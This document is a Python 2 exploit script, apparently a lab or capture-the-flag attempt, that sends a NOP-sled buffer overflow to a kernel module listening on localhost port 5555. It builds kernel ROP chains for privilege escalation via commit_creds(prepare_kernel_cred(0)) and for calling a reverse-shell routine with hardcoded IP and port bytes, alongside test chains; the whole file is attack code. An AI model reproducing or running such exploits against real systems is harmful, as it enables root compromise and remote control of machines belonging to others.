#! /usr/bin/env python2
import socket
import struct
from pwn import p64 , p32
offset=1024
port=5555
text_addr="\x00\x0b\x5d\xc0\xff\xff\xff\xff" #0xffffffffc05db000
redirect_addr=p64(0xffffffffc0624270) #ffffffffc04301e0
exit_addr="\x64\x4c\x43\xc0\xff\xff\xff\xff" #ffffffffc0434c64
hello_addr="\x00\x30\x45\xc0\xff\xff\xff\xff" #0xffffffffc0453000
buf_addr="\x28\x81\x18\x51\xff\xff\xff\xff"
egg_variable_addr="\x8e\xe6\xff\xff"  # 0x0xffffe68e
syscall_table_addr=p64(0xffffffff81a00244)# ffffffff81a00240+0*4
print("syscall_table_addr",syscall_table_addr)									

#rop_gadget=p64(0xffffffff812b9ecf)+p64(0x0)+prepare_kernel_cred_addr+p64(0xffffffff81077ef8)+commit_cred_addr
# payload=prefix+nopsled+buf +eip + padding 
eip = '\x58\xa9\xff\xff' #0xffffa958
PORT="\x7a\x69"
IPADDR="\x90\xf6\x1c\xac"

# call revshell


# dummy + revshell()
#rop_gadget=p64(0xffffffff81522c71)+revshell_addr
# jump rbp
#rop_gadget=p64(0xffffffff81d4db89)

# uid =0
#rop_gadget=POP_RDI+prepare_kernel_cred_addr+MOV_RAX_RDI+commit_cred_addr+p64(0xffffffff81522c71)+revshell_addr

#commit_creds(prepare_kernel_cred_addr(0))

# pop rbx ; ret; call rbx ; # to call any function pointer
rop_gadget=p64(0xffffffff8105c144)+p64(0xffffffffc06d11e0)+p64(0xffffffff8101b171)


"""

the real exploit: 

xor rdi, rdi;ret 
call prepare_kernel_addr # equivalent to the 3 gadget line 

mov rdi, rax;ret 
call commit_creds_addr  # commit_creds_addr
call rcx
ret



"""
# 0xffffffff8105c144
XOR_RDI=p64(0xffffffff81522c71)+p64(0xffffffff810f21ba)
PREPARE_KERNEL_CRED=p64(0xffffffff8105c144)+p64(0xffffffff810a2590)+p64(0xffffffff8101b171)
MOV_RDI_RAX=p64(0xffffffff8101faab)+p64(0xffffffff810b69dd)
COMMIT_CRED=p64(0xffffffff8105c144)+p64(0xffffffff810a2266)+p64(0xffffffff8101b171) # maybe we need to add 2 instructions
REVSHELL=p64(0xffffffff8105c144)+p64(0xffffffffc03e5210)+p64(0xffffffff81b3ca87 )
POP_RBX_CALL_RBX=p64(0xffffffff8105c144)+p64(0xffffffff8101b171)
DEBUG=p64(0xffffffff8105c144)+p64(0xffffffffc05b31e0)+p64(0xffffffff81b3ca87)
RET=p64(0xffffffff8100006b)
POP_RDI_RET=p64(0xffffffff810b69dd)
POP_RSI_RET=p64(0xffffffff8124baae)

rop_gadget=XOR_RDI+PREPARE_KERNEL_CRED+MOV_RDI_RAX+COMMIT_CRED+REVSHELL
rop_gadget=DEBUG+REVSHELL+POP_RBX_CALL_RBX+POP_RBX_CALL_RBX
print("deadbeef :{}".format(p32(0xdeadbeef)))
rop_gadget1=POP_RDI_RET+"\xef\xbe\xad\xde\xef\xbe\xad\xde"+p64(0xffffffffc03e5210)
rop_gadget2=POP_RDI_RET+"\xef\xbe\xad\xde\xef\xbe\xad\xde"+POP_RSI_RET+"\x01"*8+p64(0xffffffffc03e3210)

# rop gadget 3 chaining functions 
rop_gadget3=p64(0xffffffffc03e31e0)+POP_RDI_RET+"\xef\xbe\xad\xde\xef\xbe\xad\xad" + p64(0xffffffffc03e3210)+POP_RDI_RET+"\xef\xbe\xad\xde\xef\xbe\xad\xad"

# rop_gadget4 print hello world 
rop_gadget4=POP_RDI_RET+"\xef\xbe\xad\xde\xef\xbe\xad\xde"+p64(0xffffffff818184b5)

payload="\x90"*offset+"\x90"*8+rop_gadget3

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', port))
s.send(payload)
#print s.recv(1024)

s.close()